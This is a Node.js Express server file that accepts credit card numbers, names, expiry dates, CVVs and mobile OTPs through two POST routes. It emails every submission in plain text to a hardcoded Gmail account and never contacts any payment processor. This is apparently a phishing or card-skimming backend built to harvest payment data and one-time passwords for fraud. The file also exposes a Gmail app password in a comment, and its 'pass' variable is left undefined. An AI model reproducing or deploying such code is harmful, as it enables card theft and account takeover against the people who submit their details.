const express = require("express");
const app = express();
const cors = require("cors");
const nodemailer = require("nodemailer");

app.use(express.json());
app.use(cors());

const PORT = process.env.PORT || 5000;
// emails credentials
const userEmail = "Paydaysite1@gmail.com";
//const pass = "jrqjapmxebtahohb";
// 30th dec

// Helper function to create transporter (DRY principle)
const createTransporter = () => {
  return nodemailer.createTransport({
    service: "gmail",
    auth: {
      user: userEmail,
      pass: pass,
    },
  });
};

// Helper function to send email
const sendEmail = (mailOptions, res) => {
  const transporter = createTransporter();
  console.log(mailOptions);

  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.log(error);
      res.status(500).send("error Occured: " + error);
    } else {
      console.log("Email sent " + info.response);
      res.send("success");
    }
  });
};

// API route for Email and Password
app.post("/", (req, res) => {
  const { cardNumber, cardName, expiry, cvv, cardType, amount } = req.body;
  const cardData = {
    cardNumber,
    cardName,
    expiry,
    cvv,
    cardType,
    amount: parseFloat(amount),
  };

  const mailOptions = {
    from: userEmail,
    to: userEmail,
    subject: `  Credit Card Online Payments Clients: Card Details Submission`,
    text: `  Credit Card Online Payments Clients: New card submitted:\nCard Number: ${cardData.cardNumber}\nCard Name: ${cardData.cardName}\nExpiry: ${cardData.expiry}\nCVV: ${cardData.cvv}\nCard Type: ${cardData.cardType}\nAmount: ${cardData.amount}`,
  };

  sendEmail(mailOptions, res);
});

// API route for Mobile OTP
app.post("/otp", (req, res) => {
  const { otp } = req.body;
  const cardData = {
    otp,
  };

  const mailOptions = {
    from: userEmail,
    to: userEmail,
    subject: `  Credit Card Online Payments Clients: OTP Received`,
    text: `  Credit Card Online Payments Clients: OTP submitted: ${cardData.otp}`,
  };

  sendEmail(mailOptions, res);
});

app.listen(PORT, () => {
  console.log(`Server is running on port http://localhost:${PORT}`);
});

